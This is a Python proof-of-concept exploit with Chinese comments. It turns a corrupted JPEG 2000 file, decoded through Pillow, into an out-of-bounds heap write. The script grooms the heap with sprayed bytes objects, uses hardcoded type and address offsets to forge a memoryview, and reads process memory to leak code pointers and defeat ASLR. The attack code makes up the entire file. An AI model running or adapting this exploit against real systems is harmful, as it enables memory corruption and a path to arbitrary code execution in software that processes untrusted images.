#!/usr/bin/env python3
# 信息泄露 PoC（终版）：混淆对象在【子进程】里生成，所以扫描+读取也必须在子进程里做，结果落盘
#   越界写把喷射出的 bytes 对象改成 memoryview：
#     +0x08 = 0xa350c8 (PyMemoryView_Type)   ← 值是文件偏移，可直接表达
#     +0x38 = 0xa500d0 (要读的地址)           ← 同上，且 > 0xa350c8 满足构造器 A<B<C
#     +0x48 = 被耦合为 buf+2（巨大 len，正好用来读）
#   对象内容预置：+0x40 view.obj = 合法对象；+0x58 = 0x100000000（ndim=1, readonly=0）
#   => v[:64].tobytes() 读出 .data 里的代码指针 => 打掉 ASLR
import ctypes, gc, io, os, struct, subprocess, sys
from PIL import Image

R = lambda a: ctypes.c_uint64.from_address(a).value
PY_MV = 0xA350C8
READ_ADDR = 0xA500D0
PY_BYTES_TYPE = 0xA22670
RES = '/tmp/leak_result.txt'

raw = bytearray(519)                                  # 与 D 同档（chunk 0x230）
struct.pack_into('<Q', raw, 0x20, PY_BYTES_TYPE)      # obj+0x40 = view.obj（非空合法）
struct.pack_into('<Q', raw, 0x28, 0x40)               # obj+0x48 = len（会被覆盖，无妨）
struct.pack_into('<Q', raw, 0x30, 1)                  # obj+0x50 = itemsize
struct.pack_into('<Q', raw, 0x38, 0x100000000)        # obj+0x58 = readonly/ndim
VICTIM_CONTENT = bytes(raw)

# 越界写：+0x08 <- A, +0x20 <- B, +0x38 <- C（A<B<C）
A = PY_MV
B = 0xA40000
C = READ_ADDR
r = subprocess.run(['python3', '/tmp/mk13.py', '/tmp/exp/base.j2k', '/tmp/LEAK.j2k', '0', '23',
                    hex(A), hex(B), hex(C), '-370'], capture_output=True, text=True)
print("[*] build:", (r.stdout + r.stderr).strip()[:70])
if 'OK' not in r.stdout:
    sys.exit(1)

pid = os.fork()
if pid == 0:
    out = []
    try:
        good = []
        for _try in range(8):
            gc.collect()
            prime = [bytes(519) for _ in range(1024)]
            del prime
            pairs = [(bytes(519), bytes(bytearray(VICTIM_CONTENT))) for _ in range(400)]
            good = [(D, Bv) for (D, Bv) in pairs if id(Bv) - id(D) == 0x230]
            if good:
                break
            del pairs
        out.append("相邻对=%d (试了%d次)" % (len(good), _try + 1))
        if good:
            keep = [t for i2, t in enumerate(good) if i2 != len(good) // 2]
            Ks = [Bv for (D, Bv) in keep]
            holeD = good[len(good) // 2][0]
            del holeD, pairs, good
            gc.collect()
            M = open('/tmp/LEAK.j2k', 'rb').read()
            im = Image.open(io.BytesIO(M)); im.load()
            out.append("解码完成")
            hits = [Bv for Bv in Ks if R(id(Bv) + 8) == PY_MV]
            out.append("命中 memoryview 的对象数=%d" % len(hits))
            if hits:
                v = hits[0]
                out.append("命中: id=%#x buf=%#x len=%#x" % (id(v), R(id(v) + 0x38), R(id(v) + 0x48)))
                try:
                    data = v[:64].tobytes()
                    out.append("读出64B=" + data.hex())
                    ptrs = [struct.unpack_from('<Q', data, k)[0] for k in range(0, 64, 8)]
                    out.append("其中指针=" + ",".join(hex(x) for x in ptrs if x > 0x10000))
                except BaseException as e:
                    out.append("读取异常 %r" % (e,))
    except BaseException as e:
        out.append("异常 %r" % (e,))
    with open(RES, 'w') as f:
        f.write("\n".join(out))
    os._exit(0)
os.waitpid(pid, 0)
print(open(RES).read() if os.path.exists(RES) else "(无结果)")